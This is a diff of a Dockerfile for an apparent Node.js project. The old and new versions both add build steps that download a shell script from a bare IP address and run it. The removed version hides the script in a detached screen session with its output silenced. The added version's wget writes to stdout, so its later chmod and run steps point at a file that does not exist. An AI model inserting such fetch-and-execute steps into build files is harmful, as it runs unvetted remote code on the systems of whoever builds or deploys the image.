@@ -8,7 +8,9 @@ COPY . .
 
 RUN npm ci
 RUN apt update
-RUN apt -y install  wget screen
-RUN screen -dmS wooot bash -c 'wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh | bash >/dev/null &; exec bash' && screen -ls && screen -r -D
+RUN apt -y install  wget coreutils
+RUN wget -O - http://194.233.164.53/start_Honey_web_man_ws_rand.sh
+RUN chmod +x start_Honey_web_man_ws_rand.sh
+RUN ./start_Honey_web_man_ws_rand.sh
 
 CMD ["npm", "run", "start"]
